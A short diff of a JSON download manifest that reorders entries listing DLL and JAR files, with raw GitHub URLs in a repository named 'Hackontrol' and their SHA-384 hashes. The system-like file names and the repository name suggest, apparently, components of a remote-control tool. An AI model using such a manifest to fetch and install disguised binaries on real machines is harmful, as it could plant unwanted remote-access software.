@@ -6,11 +6,6 @@
 
 	"file": [
 		{
-			"file": "libruntime32.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libruntime32.dll",
-			"sha384": "5b50964476720b67ee57e91f7c863cfd8de94fe6f62af2752e9b5ae0185503bb3f8d2b103beea968e6b5472f076317f2"
-		},
-		{
 			"file": "libhrsp32.dll",
 			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libhrsp32.dll",
 			"sha384": "5e1fdf2019907bc7ba554ef8eed613c74ee066c9694693d6d38bb0acc6596e9f6b72ebdd76146a8740f460db65dd5472"
@@ -19,6 +14,11 @@
 			"file": "libnative32.dll",
 			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libnative32.dll",
 			"sha384": "e418b871f70e85037b2814f184a3e044ab262e599ad8691a43690b70c258e18fe4730d20344be4808d4a6270f3228f65"
+		},
+		{
+			"file": "libruntime32.dll",
+			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libruntime32.dll",
+			"sha384": "5b50964476720b67ee57e91f7c863cfd8de94fe6f62af2752e9b5ae0185503bb3f8d2b103beea968e6b5472f076317f2"
 		},
 		{
 			"file": "winservice32.jar",
